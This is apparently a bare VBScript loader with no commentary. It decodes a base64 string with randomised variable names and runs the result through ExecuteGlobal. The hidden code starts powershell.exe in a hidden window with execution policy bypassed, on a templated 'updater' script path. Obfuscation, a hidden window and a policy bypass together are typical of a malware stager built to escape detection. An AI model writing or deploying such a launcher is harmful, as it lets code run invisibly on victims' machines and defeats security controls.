Dim tbitwkzz
tbitwkzz = ""
tbitwkzz = tbitwkzz & "TwBwAHQAaQBvAG4AIABFAHgAcABsAGkAYwBpAHQACgBEAGkAbQAgAG8AUwBoAGUAbABsACwAIABzAEM"
tbitwkzz = tbitwkzz & "AbQBkAAoAUwBlAHQAIABvAFMAaABlAGwAbAAgAD0AIABDAHIAZQBhAHQAZQBPAGIAagBlAGMAdAAoAC"
tbitwkzz = tbitwkzz & "IAVwBTAGMAcgBpAHAAdAAuAFMAaABlAGwAbAAiACkACgBzAEMAbQBkACAAPQAgACIAcABvAHcAZQByA"
tbitwkzz = tbitwkzz & "HMAaABlAGwAbAAuAGUAeABlACAALQBOAG8AUAByAG8AZgBpAGwAZQAgAC0ATgBvAG4ASQBuAHQAZQBy"
tbitwkzz = tbitwkzz & "AGEAYwB0AGkAdgBlACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABIAGkAZABkAGUAbgAgAC0ARQB"
tbitwkzz = tbitwkzz & "4AGUAYwB1AHQAaQBvAG4AUABvAGwAaQBjAHkAIABCAHkAcABhAHMAcwAgAC0ARgBpAGwAZQAgACIAIg"
tbitwkzz = tbitwkzz & "AlACUAVQBQAEQAQQBUAEUAUgBfAFAAUwAxAF8AUABBAFQASAAlACUAIgAiACIACgBvAFMAaABlAGwAb"
tbitwkzz = tbitwkzz & "AAuAFIAdQBuACAAcwBDAG0AZAAsACAAMAAsACAAVAByAHUAZQAKAFMAZQB0ACAAbwBTAGgAZQBsAGwA"
tbitwkzz = tbitwkzz & "IAA9ACAATgBvAHQAaABpAG4AZwA="
Dim onpucjuy : Set onpucjuy = CreateObject("ADODB.Stream")
onpucjuy.Type = 1 : onpucjuy.Open
Dim dnmmvwmu : Set dnmmvwmu = CreateObject("MSXml2.DOMDocument").createElement("z")
dnmmvwmu.dataType = "bin.base64" : dnmmvwmu.text = tbitwkzz
onpucjuy.Write dnmmvwmu.nodeTypedValue
onpucjuy.Position = 0 : onpucjuy.Type = 2 : onpucjuy.Charset = "UTF-16LE"
Dim gxqvxvdv : gxqvxvdv = onpucjuy.ReadText : onpucjuy.Close
ExecuteGlobal gxqvxvdv